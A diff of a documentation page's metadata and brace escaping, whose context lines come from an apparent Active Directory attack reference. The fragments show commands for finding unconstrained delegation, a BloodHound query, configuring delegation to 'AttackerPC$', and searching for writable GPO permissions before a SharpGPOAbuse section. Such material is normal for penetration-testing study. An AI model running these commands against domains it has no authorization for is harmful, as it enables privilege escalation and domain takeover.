@@ -8,7 +8,12 @@ lang: "英文"
 tier: 3
 volume: "09-harness"
 sourceUrl: "https://github.com/zebbern/claude-code-guide"
-entryUrl: "https://github.com/zebbern/claude-code-guide/blob/64c890fe74c3ccfad673dc9c71dc85b8dd2f4817/README.md"
+entryUrl: "https://github.com/zebbern/claude-code-guide/blob/64c890fe74c3ccfad673dc9c71dc85b8dd2f4817/skills/active-directory-attacks/references/advanced-attacks.md"
+sourceRel: "skills/active-directory-attacks/references/advanced-attacks.md"
+rawUrl: "/raw/09-harness/claude-code-guide-zebbern/skills/active-directory-attacks/references/advanced-attacks.md"
+sourceSha256: "2b5eb51995be2e05378ab669d59ff88b95cf87ea891940efe48dc1c7db169316"
+pageSha256: "2b5eb51995be2e05378ab669d59ff88b95cf87ea891940efe48dc1c7db169316"
+contentMode: "local-full"
 zh: ""
 ---
 
@@ -36,7 +41,7 @@ When a user authenticates to a computer with unconstrained delegation, their TGT
 **Find Delegation:**
 ```powershell
 # PowerShell
-Get-ADComputer -Filter {TrustedForDelegation -eq $True}
+Get-ADComputer -Filter \{TrustedForDelegation -eq $True}
 
 # BloodHound
 MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
@@ -97,7 +102,7 @@ Set-ADComputer target -PrincipalsAllowedToDelegateToAccount AttackerPC$
 ### Find Vulnerable GPOs
 
 ```powershell
-Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|WriteDacl|WriteOwner")}
+Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs | Where-Object \{($_.ActiveDirectoryRights.ToString() -match "GenericWrite|WriteDacl|WriteOwner")}
 ```
 
 ### Abuse with SharpGPOAbuse
